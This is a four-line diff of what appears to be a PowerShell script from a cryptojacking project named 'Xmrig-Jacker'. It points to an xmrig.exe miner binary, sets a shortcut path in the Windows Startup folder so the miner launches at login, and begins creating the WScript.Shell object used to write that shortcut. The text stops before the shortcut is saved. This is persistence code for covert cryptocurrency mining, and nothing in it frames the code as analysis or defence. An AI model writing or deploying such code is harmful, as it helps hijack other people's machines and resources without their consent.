@@ -1,4 +1,4 @@
-$scriptPath = "C:\temp\xmrig.exe"
+$scriptPath = "C:\temp\Xmrig-Jacker-main\xmrig\xmrig.exe"
 $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\xmrig.lnk"
 
 $shell = New-Object -ComObject WScript.Shell
